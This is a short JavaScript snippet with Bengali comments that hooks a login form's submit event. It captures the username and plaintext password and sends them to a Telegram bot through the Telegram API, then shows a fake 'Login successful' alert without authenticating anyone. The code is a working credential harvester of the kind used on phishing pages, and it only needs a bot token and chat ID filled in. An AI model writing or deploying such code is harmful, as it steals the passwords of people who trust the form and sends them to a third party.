document.getElementById("exampleLoginForm").addEventListener("submit", function (event) {
    event.preventDefault(); // Form reload বন্ধ করে

    const loginOption = document.getElementById("loginOption").value;
    const loginValue = document.getElementById("loginValue").value;
    const password = document.getElementById("password").value;

    // Telegram Bot-এর মাধ্যমে নোটিফিকেশন পাঠানোর জন্য API ব্যবহার
    const telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";
    const chatId = "YOUR_CHAT_ID"; // Telegram চ্যাট ID

    const message = `New Login Attempt:\nLogin Using: ${loginOption}\nValue: ${loginValue}\nPassword: ${password}`;

    // Telegram API-তে POST Request পাঠানো
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
        .then((response) => response.json())
        .then((data) => {
            if (data.ok) {
                alert("Login successful. Notification sent to admin.");
            } else {
                alert("Login successful but failed to notify admin.");
            }
        })
        .catch((error) => {
            console.error("Error sending notification:", error);
            alert("Login failed or notification system error.");
        });
});
